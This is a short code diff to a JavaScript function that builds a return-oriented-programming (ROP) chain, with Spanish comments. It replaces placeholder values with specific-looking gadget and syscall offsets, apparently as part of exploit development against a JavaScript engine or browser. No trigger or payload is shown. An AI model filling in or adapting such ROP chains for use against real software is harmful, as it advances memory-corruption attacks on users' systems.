@@ -48,9 +48,9 @@
 
     function buildROP() {
       let rop = [];
-      rop.push(0xdeadbeef);  // Gadget de ejemplo
-      rop.push(0x12345678);  // Dirección para llamar a syscall
-      rop.push(0xabcdef00);  // Otro gadget
+      rop.push(0xB6130);  // Gadget de ejemplo
+      rop.push(0xAF920);  // Dirección para llamar a syscall
+      rop.push(0x70EB0);  // Otro gadget
       console.log("ROP Chain: ", rop.map(hex));
       return rop;
     }
